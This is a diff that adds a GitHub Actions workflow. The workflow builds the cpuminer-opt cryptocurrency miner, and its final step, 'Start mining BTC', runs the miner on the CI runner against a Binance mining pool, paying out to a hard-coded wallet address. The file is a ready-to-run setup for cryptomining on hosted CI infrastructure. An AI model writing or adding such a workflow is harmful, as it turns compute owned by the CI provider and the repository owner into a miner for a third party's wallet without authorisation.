@@ -1,0 +1,28 @@
+name: Build cpuminer-opt
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout repo
+        uses: actions/checkout@v2
+
+      - name: Install dependencies
+        run: |
+          sudo apt update
+          sudo apt install -y automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev git build-essential
+
+      - name: Clone cpuminer-opt
+        run: |
+          git clone https://github.com/JayDDee/cpuminer-opt.git
+          cd cpuminer-opt
+          ./build.sh
+
+      - name: Start mining BTC
+        run: |
+          cd cpuminer-opt
+          ./cpuminer -a sha256d -o stratum+tcp://sha256.poolbinance.com:3333 -u 1NLbvnF9FdVdBS4wRrA2WJ7AF7zzXfgJ1f.worker001 -p x
